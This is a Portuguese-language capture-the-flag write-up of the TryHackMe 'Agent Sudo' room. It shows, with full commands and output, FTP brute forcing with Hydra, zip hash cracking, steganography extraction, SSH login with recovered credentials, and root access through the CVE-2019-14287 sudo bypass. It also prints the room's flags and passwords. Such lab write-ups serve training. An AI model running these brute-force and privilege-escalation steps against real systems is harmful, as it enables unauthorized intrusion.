# SUDO


### IP

export IP="10.10.168.86"


### Nmap

- Identificado 3 portas abertas.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Identificado o conteúdo da página inicial

- A orientação passada na página inicial é usar o codinome como "user-agent", para tentar identificar o agente correto e ler as mensagens.

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```
- Utilizado o "curl -A" para passar os "user-agent". 
- Foi tentado sem a opção "-L" e retornou a página, por que provavelmente estava retornando um status code "3xx".
- Com a opção "-L", foi refeito a requisição de modo a buscar o conteúdo redirecionado "user-agent".

```
curl -A "C" -L 10.10.168.86
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

### Efetuado brute force no FTP

- Identificado o usuário "chris", utilizado o mesmo com a wordlist "rockyou.txt", para fazer o brute force no FTP.

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.168.86

[21][ftp] host: 10.10.168.86   login: chris   password: crystal
```
- Identificado o login e a senha:
	- Login: chris
	- Senha: crystal

### Acessando o FTP

- Efetuado o acesso ao FTP do usuário "chris" e efetuado o download dos arquivos

```
ftp 10.10.168.86
Connected to 10.10.168.86.
220 (vsFTPd 3.0.3)
Name (10.10.168.86:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,168,86,60,46).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
227 Entering Passive Mode (10,10,168,86,21,66).
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (1.0835 MB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
227 Entering Passive Mode (10,10,168,86,160,137).
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.54 secs (60.1954 kB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
227 Entering Passive Mode (10,10,168,86,157,170).
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.52 secs (65.7211 kB/s)
```

### Identificação de informações

- No arquivo mostrado abaixo, consta que há informações de senha dentro de um arquivo de imagem, possívelmente dos que baixei.

```
cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

### Exiftool 

- Identificado dentro do arquivo "cutie.png", que ele possui um binário escondido dentro dele.

```
exiftool cutie.png     
ExifTool Version Number         : 12.16
File Name                       : cutie.png
Directory                       : .
File Size                       : 34 KiB
File Modification Date/Time     : 2021:06:13 21:25:47-04:00
File Access Date/Time           : 2021:06:13 21:27:56-04:00
File Inode Change Date/Time     : 2021:06:13 21:25:47-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
```

### Extrair arquivo binário de dentro da imagem

- Identificado que há um arquivo ZIP dentro da imagem.

```
inwalk cutie.png                                                                                                                                               1 ⨯

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

- Extraido o arquivo ZIP

```
binwalk -e cutie.png                                                                                                                                            3 ⨯

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
```
ls _cutie.png.extracted
-rw-r--r-- 1 root root 279312 Jun 14 20:05 365
-rw-r--r-- 1 root root  33973 Jun 14 20:05 365.zlib
-rw-r--r-- 1 root root    280 Jun 14 20:05 8702.zip
-rw-r--r-- 1 root root      0 Oct 29  2019 To_agentR.txt
```

### Identificado a HASH do arquivo ZIP

- O John The Ripper, tem um binário que captura a hash de senha de um arquivo ZIP, "zip2john"

```
zip2john 8702.zip > hash.txt                                                                                                                                    1 
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

cat hash.txt     
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

### Quebrado a HASH com John The Ripper

- Identificado a senha do arquivo ZIP
	- 'alien'

```
john hash.txt
alien            (8702.zip/To_agentR.txt)
```

### Descompactação de arquivo com senha

- Utilizado o binário "7z", com o parametro "e" para extrair o arquivo ZIP, que logo pediu a senha encontradas.

```
7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i3-7100U CPU @ 2.40GHz (806E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 08:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```

### Identificado a senha de steganografia

- Dentro do arquivos ZIP, há um arquivos de texto, chamdaso "To_AgentR.txt", com conteúdo, que sobrescreve o arquivos existe, estava zerado.
- Dentro dele podemos identificar uma informação encodada em "Base64".

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
- Efetuado o decode da informação e recebi a mensagem "Area51"

```
echo 'QXJlYTUx' | base64 -d                                             
Area51 
```

### Efetuado reversão da Steganografia da imagem "cute-alien.jpg"

- Utilizado a senha "Area51", para remover o conteúdo esteganografado dentro do arquivo "cute-alien.jpg".
- Dentro do arquivo JPG, há um arquio de texto, message.txt com uma mensagem,

```
steghide --extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```
- Mensage do arquivo TXT.

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### Senha de SSH

- Identificado o login e a senha do SSH através do conteúdo do arquivo messages.txt.
	- Login: james
	- Senha: hackerrules!

```
ssh james@10.10.252.47               
The authenticity of host '10.10.252.47 (10.10.252.47)' can't be established.
ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.252.47' (ECDSA) to the list of known hosts.
james@10.10.252.47's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 15 01:24:55 UTC 2021

  System load:  0.0               Processes:           92
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.252.47
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```

### User-flag:

```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```

### Download e analise de outro arquivo JPG no diretório do usuário.

- Efetuado o download do arquivo via SCP.

``` 
scp james@10.10.252.47:Alien_autospy.jpg .
james@10.10.252.47's password: 
Permission denied, please try again.
james@10.10.252.47's password: 
Alien_autospy.jpg   
```
- Pesquisado no google e identificado a origem da imagem.
	- ROSWELL ALIEN AUTOPSY


### Escalação de privilégios

- Identificado a possibilidade de escalação de privilégios pelo /bin/bash.
```
sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
- Efetuado uma pesquisa no google pelo "(ALL, !root) /bin/bash"
	- Identificado que há um CVE: CVE-2019-14287, para essa vulnerabilidade
	- Encontrado exploit para o CVR-2019-14287
		- https://www.exploit-db.com/exploits/47502


### Execução do exploit (ExploitID: 47502)

- Capturado o usuário root.

```
james@agent-sudo:~$ whoami
james
james@agent-sudo:~$ 
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# 
root@agent-sudo:~# whoami
root
root@agent-sudo:~# 
```

### Root-flag

```
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 
```
